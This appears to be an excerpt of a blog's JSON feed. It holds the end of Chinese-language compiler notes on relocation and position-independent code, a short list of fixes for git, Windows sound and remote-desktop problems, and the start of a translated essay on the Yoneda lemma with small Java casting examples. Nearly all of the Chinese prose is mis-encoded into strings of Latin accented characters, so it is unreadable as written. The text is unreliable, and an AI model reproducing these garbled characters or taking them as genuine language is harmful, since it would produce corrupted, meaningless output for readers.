ˆä¸ŠæŸåœ°å€ï¼‰</li>\n<li>ä»æ ˆå¸§ä¸­æ¢å¤Callee-saveçš„å¯„å­˜å™¨</li>\n<li>å›é€€åˆ°è°ƒç”¨è€…çš„æ ˆå¸§ï¼ˆæ›´æ”¹FP&#x2F;SPï¼‰</li>\n<li>ReturnæŒ‡ä»¤</li>\n<li>ã€å¯é€‰ã€‘ä¼ªæŒ‡ä»¤æ ‡è®°å‡½æ•°åœ¨æ­¤ç»“æŸ</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>é‡å®šä½</p>\n<p>å¯¹äºæ¡ä»¶è·³è½¬æˆ–å…¶ä»–è·³è½¬æŒ‡ä»¤çš„ç›®çš„åœ°å€æœ‰å¯èƒ½åœ¨æ­¤æ—¶æ²¡æ³•ç›´æ¥ç¡®å®šã€‚ä¾‹å¦‚Cè¯­è¨€çš„ç¼–è¯‘å•å…ƒæ˜¯æ¯ä¸ª<code>.c</code> <code>.h</code>æ–‡ä»¶ï¼Œå¹¶ä¸çŸ¥é“å…¶ä»–æ–‡ä»¶å­˜åœ¨ï¼Œæ‰€ä»¥å¯èƒ½é‡åˆ°å¦‚ä¸‹æƒ…å†µï¼š</p>\n<ul>\n<li>éœ€è¦å‡½æ•°å…¥å£&#x2F;å˜é‡çš„ç»å¯¹åœ°å€ï¼Œä½†ç›®å‰åªçŸ¥é“ç›¸å¯¹åœ°å€</li>\n<li>éœ€è¦è®¿é—®åœ¨å¤–éƒ¨å®šä¹‰çš„å‡½æ•°&#x2F;å˜é‡ï¼Œä½†å°šæœªè¿›è¡Œé“¾æ¥</li>\n</ul>\n<p>å¦‚æœéƒ½èƒ½ç›´æ¥é€šè¿‡åç§»æ‰¾åˆ°ä½ç½®ï¼Œé‚£ä¹ˆå°±æ˜¯ <strong>â€œä½ç½®æ— å…³ä»£ç (PIC)â€</strong> äº†ã€‚<br>æˆ‘ä»¬ç»´æŠ¤ä¸€ä¸ªè¡¨è®°å½•éœ€è¦å¾…ç¡®å®šã€éœ€è¦åœ¨ä¹‹åè¢«å¡«å…¥çš„åœ°å€åœ¨å“ªäº›ä½ç½®ï¼Œç•™å¾…æ—¥åä½¿ç”¨ã€‚<br>å‚è€ƒELFçš„<a href=\"https://stackoverflow.com/questions/63672744/why-differentiate-rel-text-and-rel-data-section\">.rel.text</a></p>\n</li>\n</ul>\n<h2 id=\"Part-14-åŸºæœ¬å—ä¸traces\"><a href=\"#Part-14-åŸºæœ¬å—ä¸traces\" class=\"headerlink\" title=\"Part 14: åŸºæœ¬å—ä¸traces\"></a>Part 14: åŸºæœ¬å—ä¸traces</h2><p><em>&gt;&gt;&gt; To be continuedâ€¦</em></p>\n",
            "tags": [
                "Compiler",
                "Computer Science",
                "On Going"
            ]
        },
        {
            "id": "http://cubicy.icu/2024/04/12/%E8%B5%9B%E5%8D%9A%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%E8%8D%AF%E6%96%B9/",
            "url": "http://cubicy.icu/2024/04/12/%E8%B5%9B%E5%8D%9A%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%E8%8D%AF%E6%96%B9/",
            "title": "èµ›åšç–‘éš¾æ‚ç—‡è¯æ–¹",
            "date_published": "2024-04-11T17:45:01.000Z",
            "content_html": "<ul>\n<li><code>git add .</code> ä»æœ‰æ–‡ä»¶æ— æ³•åŠ å…¥<ul>\n<li>å¯èƒ½æ˜¯submoduleå¯¼è‡´ï¼Œå³ä½¿åˆ é™¤å­æ¨¡å—çš„<code>.git</code>æ–‡ä»¶å¤¹ä¹Ÿä¸è¶³å¤Ÿï¼Œè¿˜éœ€è¦<code>git rm --cached</code></li>\n</ul>\n</li>\n<li>ç”µè„‘æ€æ ·éƒ½æ²¡æœ‰å£°éŸ³ï¼Œå£°å¡ç­‰ç¡¬ä»¶å‡æ— é—®é¢˜ï¼Œé©±åŠ¨æ²¡æœ‰æ›´æ”¹è¿‡<ul>\n<li>æ£€æŸ¥æ˜¯å¦æ˜¯Windowsæ›´æ–°å¯¼è‡´ï¼Œå¯ä»¥å›æ»š</li>\n</ul>\n</li>\n<li>è¿œç¨‹æ¡Œé¢å‡ºç°å¥‡å¥‡æ€ªæ€ªçš„æ¸²æŸ“é—®é¢˜<ul>\n<li>å¯èƒ½æ˜¯ç”±äºè¿œç¨‹è®¾å¤‡æ²¡æœ‰è¿æ¥å±å¹•ï¼Œéœ€è¦ä¿æŒå±å¹•å¼€å¯ï¼›æˆ–è€…ä½¿ç”¨è™šæ‹Ÿæ˜¾ç¤ºå™¨ï¼ˆVirtual displayï¼‰</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "On Going",
                "Miscellaneous"
            ]
        },
        {
            "id": "http://cubicy.icu/yoneda/",
            "url": "http://cubicy.icu/yoneda/",
            "title": "<è¯‘>Tai-Danae Bradley: ç±³ç”°è§†è§’â†’ç±³ç”°åµŒå…¥â†’ç±³ç”°å¼•ç†",
            "date_published": "2024-04-07T18:38:20.000Z",
            "content_html": "<h1 id=\"ç±³ç”°è§†è§’-â†’-ç±³ç”°åµŒå…¥-â†’-ç±³ç”°å¼•ç†\"><a href=\"#ç±³ç”°è§†è§’-â†’-ç±³ç”°åµŒå…¥-â†’-ç±³ç”°å¼•ç†\" class=\"headerlink\" title=\"ç±³ç”°è§†è§’ â†’ ç±³ç”°åµŒå…¥ â†’ ç±³ç”°å¼•ç†\"></a>ç±³ç”°è§†è§’ â†’ ç±³ç”°åµŒå…¥ â†’ ç±³ç”°å¼•ç†</h1><p><em>æ³¨ï¼šæœ¬æ ‡é¢˜ä¸ºè¯‘è€…æ·»åŠ ã€‚</em><br>åŸä½œè€…ï¼š <a href=\"https://www.math3ma.com/about\">Tai-Danae Bradley</a><br>ç¿»è¯‘ï¼š CubicY<br>éƒ¨åˆ†å›¾ç‰‡ä¸å¯å‘æ¥æºï¼š<a href=\"https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/\">Bartosz Milewski</a></p>\n<h2 id=\"è¯‘è€…åº\"><a href=\"#è¯‘è€…åº\" class=\"headerlink\" title=\"è¯‘è€…åº\"></a><a name=\"prelude\"></a>è¯‘è€…åº</h2><p>ç±³ç”°å¼•ç†(Yoneda Lemma)å¾€å¾€æ˜¯æ–°æ‰‹åœ¨å­¦ä¹ èŒƒç•´è®ºæ—¶é‡åˆ°çš„ç¬¬ä¸€ä¸ªå¤§éšœç¢ï¼ŒçŠ¹å¦‚äº”åéŸ³å›¾ä¹‹äºæ—¥è¯­åˆå­¦è€…ã€‚ç„¶è€Œå°±è¯‘è€…æœ¬äººçœ‹æ¥ï¼Œå…¶éš¾åº¦å¹¶éæ¥è‡ªäºæ€ç»´ä¸Šçš„å¤æ‚ï¼Œè€Œæ›´å¤šæ¥è‡ªäºç¬¦å·æ»¥ç”¨ï¼ˆè®©äººä¸ç¦æƒ³é—®æ•°å­¦æ•´ä¸ªé¢†åŸŸæ˜¯ä¸æ˜¯éƒ½è¿™æ ·ï¼‰ã€‚å°½ç®¡ä¸€äº›æ¦‚å¿µåµŒå¥—å±‚æ•°è¿‡å¤šå¯¹æ€è€ƒç¡®å®é€ æˆäº†é˜»ç¢ï¼Œä½†æ˜¯é€šè¿‡æ— æ­§ä¹‰çš„ç¬¦å·ä¸ç”ŸåŠ¨çš„å›¾ç¤ºå¯ä»¥å¤§å¤§é™ä½å¿ƒæ™ºè´Ÿæ‹…ã€‚æœ¬ç³»åˆ—ä½œè€…åœ¨è¿™ä¸¤ç‚¹ä¸Šéƒ½åšå¾—ååˆ†å‡ºè‰²ï¼Œæ•…äº§ç”Ÿäº†å°†å…¶è¯‘ä¸ºä¸­æ–‡çš„æƒ³æ³•ã€‚æˆ‘ä¼šå°†ä¸€äº›ä¸ªäººçš„ç†è§£ä»¥â€œè¯‘è€…æ³¨â€çš„å½¢å¼æ”¾ç½®åœ¨æ–‡ç« å„å¤„ã€‚å°½ç®¡å¦‚æ­¤ï¼Œæˆ‘ä»ç„¶å¼ºçƒˆæ¨èè¯»è€…é˜…è¯»åŸæ–‡ã€‚</p>\n<p>ä¸ºäº†é¿å…æ­§ä¹‰ï¼Œå°†æœ¬æ–‡ä½¿ç”¨çš„éƒ¨åˆ†è®°å·ä¸çº¦å®šåˆ—ä¸¾åœ¨æ­¤ï¼š</p>\n<ul>\n<li>æˆ‘ä»¬è¯´â€œåœ¨Xæ„ä¹‰ä¸‹ç­‰ä»·â€(up to X)æœ‰å¦‚ä¸‹å‡ ç§ç­‰ä»·è¡¨è¿°ï¼š<ul>\n<li>å¯¹è±¡é—´å¦‚æœåªç›¸å·®ä¸€ä¸ªXå…³ç³»å°±å¯ä»¥è½¬æ¢ä¸ºå¯¹æ–¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬è®¤ä¸ºä»–ä»¬æ˜¯ç›¸åŒçš„</li>\n<li>å¯¹è±¡é—´æœ€å¤šç›¸å·®ä¸€ä¸ªXçš„å…³ç³»</li>\n<li>ä¸è€ƒè™‘Xå¸¦æ¥çš„å·®å¼‚æ—¶ç›¸åŒ</li>\n<li>ï¼ˆå¦‚æœXæ˜¯ä¸€ç§ç­‰ä»·å…³ç³»ï¼‰æŒ‰ç…§Xå…³ç³»åˆ’åˆ†ä¸åŒç­‰ä»·ç±»ï¼Œå¦‚æœå¯¹è±¡åœ¨ä¸€ä¸ªç­‰ä»·ç±»é‡Œåˆ™è§†ä¸ºç›¸åŒ<br>ä¾‹å¦‚ï¼šâ€œåœ¨åŒæ„æ„ä¹‰ä¸‹ç­‰ä»·â€æŒ‡çš„æ˜¯åœ¨è¿™ç§è§†è§’ä¸‹ï¼Œå¦‚æœä¸¤ä¸ªä¸åŒçš„å¯¹è±¡è‡³å¤šåªæ˜¯ç›¸å·®ä¸€ä¸ªåŒæ„å…³ç³»ï¼Œé‚£ä¹ˆæˆ‘ä»¬è®¤ä¸ºä»–ä»¬å°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼›â€up to permutationsâ€å¯ç†è§£ä¸ºâ€œä¸è€ƒè™‘ç½®æ¢å¸¦æ¥çš„å·®å¼‚æ—¶ç›¸åŒâ€ï¼›5, 8, 11åœ¨æ¨¡3çš„æ„ä¹‰ä¸‹ç­‰ä»·ã€‚</li>\n</ul>\n</li>\n<li>$ \\mathbf{Set}^{ \\mathbf{C} } $ è¡¨ç¤ºä¸€ä¸ªå‡½å­èŒƒç•´ï¼Œå…¶ä¸­çš„å‡½å­æ˜¯ $ \\mathbf{C} \\rightarrow { \\mathbf{Set} } $. ä¸ºäº†æ–¹ä¾¿ä¹¦å†™ï¼ˆ$\\mathbf{C}$ æ‰€æŒ‡ä»£çš„èŒƒç•´æ²¡æœ‰ä»€ä¹ˆæ­§ä¹‰æ—¶ï¼‰ï¼Œæœ¬æ–‡æœ‰æ—¶ä¼šå¦‚æ­¤ç®€å†™ï¼š<br>$$ \\mathbf{Set} :&#x3D; \\mathbf{Set}^{ \\mathbf{C} }<br>$$ $$ \\mathbf{Set}^{op} :&#x3D; \\mathbf{Set}^{ \\mathbf{C}^{op} } $$ è¿™ä¸€è®°å·æœ‰æ—¶åœ¨å…¶ä»–æ–‡ç« ä¸­è®°ä½œ $\\mathbf{Funct}(\\mathbf{C},\\mathbf{Set})$</li>\n<li>å¯¹äºèŒƒç•´Cä¸­çš„æ€å°„æˆ‘ä»¬è®°ä½œ $ \\text{hom}_\\mathbf{C}(X, Y) $ï¼Œç±»ä¼¼åœ°ï¼Œå¯¹ $\\mathbf{C}$ æ²¡æœ‰æ­§ä¹‰æ—¶ç®€å†™ä¸º$ \\text{hom}(X, Y) $<ul>\n<li>å½¢å¦‚ $ \\text{hom}(A, -): \\mathbf{Set}^{ \\mathbf{C} }$ çš„è®°å·ä»£è¡¨ä¸€ä¸ªå‡½å­ï¼Œå®ƒå°†Aå‘é€åˆ°â€œæ‰€æœ‰ä»Aå‡ºå‘çš„æ€å°„æ„æˆçš„é›†åˆâ€ï¼›è¿™ä¸€è®°å·æœ‰æ—¶åœ¨å…¶ä»–æ–‡ç« ä¸­è®°ä½œ $h_A$</li>\n<li>å½¢å¦‚ $ \\text{hom}(-, A): \\mathbf{Set}^{ \\mathbf{C}^{op} } $ çš„è®°å·ä»£è¡¨ä¸€ä¸ªå‡½å­ï¼Œå®ƒå°†Aå‘é€åˆ°â€œæ‰€æœ‰ä»¥Aä¸ºç›®æ ‡çš„æ€å°„æ„æˆçš„é›†åˆâ€ï¼Œè¿™ä¸€è®°å·æœ‰æ—¶åœ¨å…¶ä»–æ–‡ç« ä¸­è®°ä½œ $h^A$</li>\n<li>å½¢å¦‚ $ \\text{hom}(-, -):  \\mathbf{C} \\rightarrow \\mathbf{Set}^{ \\mathbf{C}^{op} } æˆ– \\mathbf{C}^{op} \\rightarrow \\mathbf{Set}^{ \\mathbf{C} } $ çš„è®°å·å°†Cå¯¹åº”åˆ°ä¸€ä¸ªè‡ªç„¶å˜æ¢èŒƒç•´ï¼Œå¯¹äºæ¯ä¸ªY(æˆ–X)æœ‰$ h^Y(X)&#x3D;h_X(Y)&#x3D;\\text{hom}(X, Y) $æ˜¯æ–°èŒƒç•´ä¸­çš„å¯¹è±¡ï¼Œæ‰€æœ‰Y(æˆ–X)çš„å–å€¼å¯¹åº”çš„æ–°å¯¹è±¡æ„æˆæ–°èŒƒç•´çš„å…¨éƒ¨å…ƒç´ ï¼Œè¿™ä¸€è®°å·æœ‰æ—¶åœ¨å…¶ä»–æ–‡ç« ä¸­è®°ä½œ $h^{(-)}$ æˆ– $h$ ã€‚æ ¹æ®æœ¬æ–‡å¯¹YonedaåµŒå…¥çš„å®šä¹‰ï¼Œæœ¬æ–‡ä¸­æŒ‰ $ \\mathbf{C} \\rightarrow \\mathbf{Set}^{ \\mathbf{C}^{op} }$é˜é‡Šã€‚</li>\n<li>$h^{(-)}(f)_X$ æ„ä¸ºå¯¹äºCä¸­çš„æ€å°„ $f: A \\rightarrow Aâ€™$ï¼Œ$h^{(-)}(f)$ æ˜¯ä¸€ä¸ªè‡ªç„¶å˜æ¢ï¼Œå½“å…¶é™åˆ¶åœ¨æ¯ä¸ªåˆ†é‡(component) $ X $ ä¸Šæ—¶æœ‰ $ \\text{hom}(X, A) \\rightarrow \\text{hom}(X, Aâ€™)$</li>\n</ul>\n</li>\n<li>è®¸å¤šæ–‡ç« ä¼šç›´æ¥å°† co-Yonedaå¼•ç† ç§°ä½œ Yonedaå¼•ç†ï¼Œco-YonedaåµŒå…¥ ç§°ä½œ YonedaåµŒå…¥ ã€‚ä¸ºäº†é¿å…æ­§ä¹‰ï¼Œæœ¬æ–‡è§„å®šå¦‚ä¸‹ï¼ˆä½†æœ¬è´¨ä¸Šæ²¡æœ‰åŒºåˆ«ï¼Œä¸éœ€è¦è¿‡äºæ‹…å¿ƒå¸¦æ¥ä¼šæ··ä¹±ï¼‰ï¼š<ul>\n<li>YonedaåµŒå…¥ï¼š $\\mathscr{Y}: \\mathbf{C} \\rightarrow \\mathbf{Set}^{ \\mathbf{C}^{op} }$</li>\n<li>Yonedaå¼•ç†ï¼š $\\mathbf{Nat}(\\text{hom}(âˆ’,X),F)\\cong F(X).$</li>\n<li>co-YonedaåµŒå…¥ï¼š $\\mathscr{co-Y}: \\mathbf{C}^{op} \\rightarrow \\mathbf{Set}^{ \\mathbf{C} }$</li>\n<li>co-Yonedaå¼•ç†ï¼š $\\mathbf{Nat}(\\text{hom}(X,-),F)\\cong F(X).$<br>è¯‘è€…æ¨èå°½é‡ä½¿ç”¨è‹±æ–‡çš„æœ¯è¯­ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨â€presheafâ€è€Œéâ€œé¢„å±‚â€è¿™ä¸€ç§°å‘¼ï¼‰ä»¥å‡å°‘æ­§ä¹‰ã€‚å¦‚æœè¯»è€…æ„¿æ„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¹³å‡å$ã‚ˆ$æ¥å‘½åYonedaåµŒå…¥ï¼ˆå¯èƒ½æ¯”è¾ƒæœ‰è¶£å§ï¼‰ã€‚</li>\n</ul>\n</li>\n</ul>\n<p>è¿™é‡Œæœ‰å‡ æ¡é”¦å›Šä¹Ÿè®¸èƒ½å¸®ä½ å¿«é€ŸæŠ“ä½æ ¸å¿ƒï¼Œå¦‚æœ‰é”™æ¼æ¬¢è¿æ–§æ­£ï¼å¦‚æœåœ¨é‡æ–°é˜…è¯»æ—¶æœ‰æ™•å¤´è½¬å‘ä¹‹æ„Ÿï¼ˆå°¤å…¶æ˜¯ç¬¬ä¸‰éƒ¨åˆ†ï¼‰ï¼Œä¸å¦¨è¯•ç€é˜…è¯»ä¸€ç•ªï¼ˆ<strong>å¦‚æœæ˜¯åˆæ¬¡é˜…è¯»ä¸å¦¨è·³è¿‡ï¼Œå¯ä»¥çœ‹å®Œæ–‡ç« å†å›å¤´çœ‹</strong>ï¼‰ï¼š</p>\n<ul>\n<li><p><strong>ç¬”è€…è®¤ä¸ºï¼Œå¯¹äºYonedaå¼•ç†ï¼ˆæ›´å‡†ç¡®çš„è¯´ï¼Œæ˜¯æ¨è®º 1ï¼‰æœ€ç²¾ç‚¼çš„æ€»ç»“æ˜¯ï¼šâ€œäººæ˜¯ä¸€åˆ‡ç¤¾ä¼šå…³ç³»çš„æ€»å’Œã€‚â€</strong></p>\n</li>\n<li><blockquote>\n<p>ä½ åœ¨ä¸€ä¸ªç²’å­åŠ é€Ÿå™¨å·¥ä½œã€‚ä½ æƒ³è¦ç†è§£æŸä¸ªç²’å­ï¼Œä½ æ‰€èƒ½åšçš„å°±æ˜¯å°†å…¶ä»–ç²’å­ç”©åˆ°å®ƒä¸Šé¢ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚å¦‚æœä½ äº†è§£ä½ çš„ç¥ç§˜ç²’å­å¯¹æ‰€æœ‰å¯èƒ½çš„æµ‹è¯•ç²’å­ç§ç±»ä»¥åŠæ‰€æœ‰å¯èƒ½çš„æµ‹è¯•èƒ½é‡å¤§å°æ˜¯å¦‚ä½•åšå‡ºå“åº”çš„ï¼Œé‚£ä¹ˆä½ å°±å·²ç»çŸ¥é“å…³äºä½ çš„ç¥ç§˜ç²’å­çš„ä¸€åˆ‡äº†ã€‚<br>You work at a particle accelerator. You want to understand some particle. All you can do is throw other particles at it and see what happens. If you understand how your mystery particle responds to all possible test particles at all possible test energies, then you know everything there is to know about your mystery particle.<br><em>Source: <a href=\"https://mathoverflow.net/a/3223\">https://mathoverflow.net/a/3223</a></em></p>\n</blockquote>\n</li>\n<li><p>ç†Ÿæ‚‰ç¾¤è®ºçš„è¯»è€…å¯èƒ½ä¼šæƒ³åˆ°å‡¯è±å®šç†(Cayleyâ€™s theorem)ï¼Œä¹Ÿå³æ‰€æœ‰ç¾¤ G åŒæ„äºåœ¨ G ä¸Šçš„å¯¹ç§°ç¾¤(å³ Sym(G))çš„å­ç¾¤ã€‚äº‹å®ä¸Šï¼Œå¯ä»¥è®¤ä¸ºè¿™ä¸ªå®šç†æ˜¯ç±³ç”°å¼•ç†çš„ä¸€ä¸ªç‰¹ä¾‹ã€‚æ–‡æœ«ä¼šæåˆ°å¦‚ä½•æ„é€ ä¸€ä¸ªåªæœ‰å•ä¸ªå¯¹è±¡ã€æ€å°„å¯¹åº”ç¾¤å…ƒç´ çš„èŒƒç•´å¹¶åœ¨å…¶ä¸Šåº”ç”¨Yonedaå¼•ç†ä»¥è¯æ˜ä¹‹ã€‚</p>\n<ul>\n<li>åœ¨ç¾¤ä½œç”¨è¯­è¨€ä¸‹çš„ç­‰æ•ˆè¡¨è¿°ï¼šå¦‚æœç¾¤ä½œç”¨å­ $\\sigma_g: G\\rightarrow \\text{Aut}_{\\text{set} }(S)$ (ä¹Ÿå°±æ˜¯æ¯ä¸ªå…ƒç´ å¯¹åº”åˆ°ä¸€ä¸ªè‡ªåŒæ„ä¸Š)æ˜¯å•å°„çš„ï¼ˆä¹Ÿå°±æ˜¯å•åŒæ€ï¼‰ï¼Œç¾¤ä½œç”¨ $G\\times S\\rightarrow S$åœ¨æŸä¸ªé›†åˆ Sï¼ˆS å¯ä»¥æ¥è‡ª G æœ¬èº«ï¼‰ä¸Šæ˜¯å¿ å®çš„</li>\n<li>ä¸ºä»€ä¹ˆ<strong>è¿™æ ·çš„</strong>ç¾¤ä½œç”¨æ˜¯å¿ å®çš„(faithful)ï¼Ÿåªéœ€è¦å…³æ³¨å•ä½å…ƒåœ¨é›†åˆ S ä¸­å¯¹åº”çš„å…ƒç´  uï¼šæ­¤æ—¶åœ¨ä¸åŒçš„è‡ªåŒæ„ä¸‹ u ä¸€å®šè¢«å‘é€(send)åˆ°ä¸åŒå…ƒç´ ä¸Šã€‚ï¼ˆå‚è§<a href=\"https://www.youtube.com/watch?v=sNX3txN9zc4&\">Chapter 7: Group actions, symmetric group and Cayleyâ€™s theorem | Essence of Group Theory</a>ï¼‰</li>\n<li>æ¥ä¸‹æ¥ä½ ä¼šçœ‹åˆ°ç±³ç”°å¼•ç†è¯æ˜è¿‡ç¨‹ä¸­ä¹Ÿæ˜¯é€šè¿‡å…³æ³¨æ’ç­‰æ˜ å°„è¿™æ ·çš„â€œå•ä½å…ƒâ€è¢«å‘é€è‡³ä½•å¤„ï¼ˆè¿™å•ä½å…ƒå…¶å®å¦‚åŒä¸€ä¸ªâ€œå‡ç»“æ ¸â€ï¼Œç¡®å®šäº†å…¶è¢«å‘é€è‡³ä½•æ–¹åå°†å¼•å‘è¿é”ååº”ï¼Œä½¿å¾—æ‰€æœ‰å…¶ä»–å¯¹è±¡çš„å»å‘è¢«ä¸€ä¸€ç¡®å®šï¼Œåæ–‡ä¼šè¯¦ç»†é˜è¿°ï¼‰ï¼Œä»è€Œå¾—å‡ºç±³ç”°åµŒå…¥çš„å¿ å®æ€§ã€‚è¿™ä¸æ˜¯å·§åˆã€‚</li>\n</ul>\n</li>\n<li><p>è¯‘è€…è¿™é‡Œç»™å‡ºä¸€ä¸ªä¾‹å­å¸®åŠ©è¯»è€…æ¢³ç†ç¬¬ä¸€æ¨è®ºæƒ³è¡¨è¾¾çš„ï¼šå‡è®¾ç°æœ‰Int(I), Double(D), Float(F)ä¸‰ç§ç±»å‹ï¼Œè¿™ä¸ªå®šç†å‘Šè¯‰æˆ‘ä»¬Floatç±»å‹çš„æ„ä¹‰å°±æ˜¯å¦‚ä¸‹å‡ å¥é™ˆè¿°çš„æ€»å’Œï¼š</p>\n<ul>\n<li>å¯¹äºä»»ä½•F-&gt;Içš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ï¼š<ul>\n<li>å°†f: F-&gt;Iè½¬åŒ–ä¸ºfâ€™: I-&gt;I</li>\n<li>å°†f: F-&gt;Dè½¬åŒ–ä¸ºfâ€™: I-&gt;D</li>\n<li>å°†f: F-&gt;Fè½¬åŒ–ä¸ºfâ€™: I-&gt;F<br>ä»¥åŠ</li>\n<li>å°†g: I-&gt;Iè½¬åŒ–ä¸ºgâ€™: F-&gt;I </li>\n<li>å°†g: I-&gt;Dè½¬åŒ–ä¸ºgâ€™: F-&gt;D</li>\n<li>å°†g: I-&gt;Fè½¬åŒ–ä¸ºgâ€™: F-&gt;F<br>å…­ç§è½¬åŒ–çš„å…·ä½“æ–¹å¼ç¡®å®šä¸‹æ¥ã€‚</li>\n</ul>\n</li>\n<li>å¯¹äºä»»ä½•F-&gt;Dçš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥â€¦</li>\n<li>å¯¹äºä»»ä½•F-&gt;Fçš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥â€¦<br>ï¼ˆå¦‚æœä½ è§‰å¾—æ€ªæ€ªçš„ï¼Œé‚£ä¹Ÿè®¸æ˜¯å› ä¸ºåå˜ä¸é€†å˜çš„å°é—®é¢˜ï¼‰<br>ä¾‹å¦‚ï¼Œå¯¹äºå‡½æ•°downcast: Double-&gt;Floatï¼Œæˆ‘ä»¬èƒ½å°†å–æ•´å‡½æ•°floorF: Float-&gt;Intè½¬ä¸ºå–æ•´å‡½æ•°floorD: Double-&gt;Int.<br>æ‰€ä»¥å¯¹äºå¦‚ä¸‹ä¸¤ä¸ªä»£ç ç‰‡æ®µï¼Œä»–ä»¬æ˜¯ç­‰ä»·çš„ï¼Œå¯ä»¥äº’ç›¸è½¬æ¢ï¼š<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//A</span></span><br><span class=\"line\">Double a</span><br><span class=\"line\"><span class=\"type\">Int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> floorD(a)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//B</span></span><br><span class=\"line\">Double a</span><br><span class=\"line\"><span class=\"type\">Float</span> <span class=\"variable\">b</span> <span class=\"operator\">=</span> downcast(a)</span><br><span class=\"line\"><span class=\"type\">Int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> floorF(b)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//C</span></span><br><span class=\"line\">Double a</span><br><span class=\"line\"><span class=\"type\">Int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> floorF(downcast(a))</span><br></pre></td></tr></table></figure>\nBä¸Cæ˜¾ç„¶æ˜¯ç­‰ä»·çš„ã€‚<br>Aè½¬Bæ˜¯ä¸€ç§æ‰©å±•ï¼Œè¿™ç§æ‰©å±•çš„æ„ä¹‰æ˜¯ï¼šFloatè¿™ç§ç±»å‹å¯ä»¥é€šè¿‡åœ¨Doubleå’ŒInté—´å®šä¹‰è¿™äº›å‡½æ•°çš„è½¬æ¢å…³ç³»åˆ›é€ å‡ºæ¥ã€‚<br>Bè½¬Aæ˜¯ä¸€ç§ç¼©å‡ï¼Œè¿™ç§ç¼©å‡çš„æ„ä¹‰æ˜¯ï¼šæˆ‘ä»¬ä¸éœ€è¦Floatç±»å‹çš„å…·ä½“ä¸­é—´å€¼ï¼Œä¹Ÿèƒ½è¿ç®—å‡ºç»“æœï¼<br>æ‰€ä»¥Floatè¿™ä¸€ç±»å‹ï¼Œæˆ–è€…è¯´ä»»ä½•ç‰¹å®šç±»å‹çš„æœ¬è´¨éƒ½æ˜¯åœ¨å®šä¹‰â€œæ¶‰åŠè¯¥ç‰¹å®šç±»å‹çš„è½¬æ¢å…³ç³»â€ä¹‹é—´çš„ä¸€ç§ç‰¹å®šå˜æ¢å…³ç³»ï¼ˆä¾‹å¦‚Floatç±»å‹å°†æŒ‡å¯¼å¦‚ä½•å¤åˆfloorFå’Œdowncastå¾—åˆ°floorDï¼‰.<br>è€Œè¿™ç§â€œæ¶‰åŠè¯¥ç‰¹å®šç±»å‹çš„è½¬æ¢å…³ç³»â€çš„ç‰¹å®šå˜æ¢å…³ç³»ï¼Œå’Œâ€œå„ç§ç±»å‹çš„è½¬æ¢å…³ç³»â€æ˜¯åŒæ„çš„ï¼Œè€Œä¼—æ‰€å‘¨çŸ¥èŒƒç•´è®ºä»ä¸è¦æ±‚ç›¸ç­‰ï¼Œåªè¦æ±‚åŒæ„ï¼Œ<br><strong>æ‰€ä»¥ä¸€ç§ç±»å‹å³ä»£è¡¨äº†ä¸€ç§å¯¹åº”è¯¥ç±»å‹çš„ç‰¹å®šå˜æ¢å…³ç³»ï¼Œè¿™ç§å¯¹åº”è¯¥ç±»å‹çš„ç‰¹å®šå˜æ¢å…³ç³»å³å®šä¹‰äº†è¯¥ç±»å‹ã€‚</strong></li>\n</ul>\n</li>\n<li><p>ï¼ˆè¿™é‡Œæ˜¯åŸºäºco-Yonedaçš„å™è¿°ï¼Œä½†åæ­£æœ¬è´¨ä¸Šæ²¡æœ‰åŒºåˆ«ï¼‰ä¸€ç§<a href=\"https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/\">æ¥è‡ªBartosz Milewskiçš„ç†è§£</a>ï¼šä»»ä½•æ•°æ®ç±»å‹ T éƒ½å¯ä»¥è¢«ä¸€ä¸ªå‡½æ•° f æ‰€å–ä»£ã€‚f æ¥å—ä¸€ä¸ªTçš„â€œå¤„ç†å™¨â€handlerï¼ˆè¿™ä¸ªhandlerä¼šæŠŠTè½¬æˆç›®æ ‡ç±»å‹ï¼‰ å¹¶æ‰§è¡Œå…¶ä½™è®¡ç®—â€”â€”å³æ˜¯ç»­å»¶ï¼ˆContinuationï¼‰ã€‚</p>\n<ul>\n<li>Haskellè¡¨è¿°ï¼š <code>forall x . (t -&gt; x) -&gt; F x â‰… F t</code></li>\n<li>æˆ‘ä»¬å¯ä»¥æŠŠå‡½å­çœ‹æˆä¸€ç§å¹¿ä¹‰çš„å®¹å™¨ï¼ˆå‚è§ï¼š<a href=\"https://bartoszmilewski.com/2014/01/14/functors-are-containers/trackback/\">Functors are Containers</a>ï¼‰ï¼Œæ‰€ä»¥å·¦è¾¹å°±æ˜¯æŠŠtè½¬æˆxï¼Œç„¶åå˜æˆF 